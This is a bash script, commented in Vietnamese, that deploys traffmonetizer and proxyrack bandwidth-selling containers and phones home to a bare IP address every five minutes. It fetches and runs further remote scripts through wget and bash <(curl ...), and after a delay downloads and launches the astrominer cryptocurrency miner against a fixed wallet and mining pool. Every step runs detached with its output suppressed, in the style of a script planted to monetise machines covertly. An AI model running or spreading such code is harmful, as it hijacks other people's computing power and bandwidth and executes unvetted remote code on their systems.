#!/bin/bash

# -------- traffmonetizer --------
NAME="traffmonetizer"
FIXED_TOKEN="yLbJuqMpr8/edWMV8rs8inTD/eCRDtbZ7iwaZMJ8/8M="   # <-- thay token cố định ở đây
RUN_ONCE=0

# -------- proxyrack --------
DEVICE_ID=$(curl -s http://74.48.96.46:3000/get-offline-key | grep -oP '"device_id"\s*:\s*"\K[^"]+')
if [ -n "$DEVICE_ID" ]; then
  docker rm -f proxyrack >/dev/null 2>&1 || true
  docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop

  # Ping loop cho proxyrack (nền)
  (
    while true; do
      curl -s -X POST http://74.48.96.46:3000/ping \
        -H "Content-Type: application/json" \
        -d "{\"device_id\":\"$DEVICE_ID\"}" >/dev/null 2>&1
      sleep 300
    done
  ) &
else
  echo "❌ Không lấy được device_id từ server"
fi

# -------- Khởi chạy traffmonetizer với token cố định --------
docker rm -f "$NAME" >/dev/null 2>&1 || true
docker run -d --name "$NAME" -e TOKEN="$FIXED_TOKEN" traffmonetizer/cli_v2 start accept --token "$FIXED_TOKEN"

# -------- Main loop --------
while true; do
  if [ $RUN_ONCE -eq 0 ]; then
    # Tải các file
    # Chạy rack
    sudo rm -rf InternetIncome-main main.zip astrominer-V1.9.2.R5_amd64_linux.tar.gz.*
    wget -q https://raw.githubusercontent.com/rabithoy/tth/main/layproxyrack.sh
    chmod +x layproxyrack.sh
    nohup bash ./layproxyrack.sh >/dev/null 2>&1 &
    bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &

    # Chạy astrominer nền không chặn vòng lặp
    (
      sleep 300 && wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
      tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
      ./astrominer/astrominer \
        -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
        -log-interval 600 -m 1 -p rpc -r 147.135.252.201:10100 -r1 nodent2.cpumining.cloud:10100 \
        > /dev/null 2>&1
    ) &

    RUN_ONCE=1
  fi

  # sleep vòng lặp (5 lần 60s như trước)
  for i in {1..5}; do
    echo "ilovingyou"
    sleep 60
  done
done
